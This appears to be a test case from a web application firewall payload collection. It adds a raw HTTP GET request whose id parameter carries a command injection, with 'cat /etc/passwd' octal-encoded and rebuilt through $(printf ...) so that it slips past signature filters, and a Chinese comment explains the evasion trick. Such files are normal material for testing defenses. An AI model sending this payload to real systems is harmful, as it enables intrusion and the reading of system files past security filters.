@@ -1,0 +1,9 @@
+# 命令执行(八进制编码绕过)
+# 将命令 cat /etc/passwd转换为八进制字符串 \143\141\164\040\057\145\164\143\057\160\141\163\163\167\144\012 隐藏特征，利用管道符和linux命令还原八进制字符串并执行命令。
+GET /?id=$%28printf%20%22%5C143%5C141%5C164%5C040%5C057%5C145%5C164%5C143%5C057%5C160%5C141%5C163%5C163%5C167%5C144%5C012%22%29&bid=hd_tag_m8mv25jy HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25jy
+RM-PRO-Token: 4086c6278e857e2bb670f25d2a64840b
+RM-PRO-Time: 1742808474923
+User-Agent: curl/7.83.1
+
